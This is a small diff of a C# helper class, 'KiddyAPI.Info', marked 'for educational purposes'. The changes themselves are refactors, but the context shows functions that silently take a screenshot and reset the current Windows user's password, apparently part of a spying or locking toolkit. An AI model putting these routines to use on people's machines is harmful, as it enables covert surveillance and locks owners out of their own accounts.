@@ -2,6 +2,7 @@
 //// Developer : Whiro
 //// For for educational purposes
 //////////////////////////////////////////////////////////
+
 using System;
 using System.Collections.Generic;
 using System.DirectoryServices.AccountManagement;
@@ -16,7 +17,7 @@ namespace KiddyAPI.Info
     public class SystemWork
     {
         /// <summary>
-        /// Получаем информацию о каком то модуле
+        /// Win M
         /// </summary>
         /// <param name="WinClass">Класс WMI</param>
         /// <param name="ClassItem">Имя в классе</param>
@@ -72,7 +73,7 @@ namespace KiddyAPI.Info
         public static void GetScreen(string path)
         {
             var scrn = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-            var graphics = Graphics.FromImage(scrn as Image);
+            var graphics = Graphics.FromImage(scrn);
             graphics.CopyFromScreen(0, 0, 0, 0, scrn.Size);
             var img = scrn;
             img.Save(path);
@@ -86,8 +87,7 @@ namespace KiddyAPI.Info
         {
             PrincipalContext context = new PrincipalContext(ContextType.Machine);
             UserPrincipal currentUser = UserPrincipal.FindByIdentity(context, IdentityType.SamAccountName, Environment.UserName);
-            currentUser.SetPassword(pass);
-            
+            currentUser?.SetPassword(pass);
         }
     }
 }
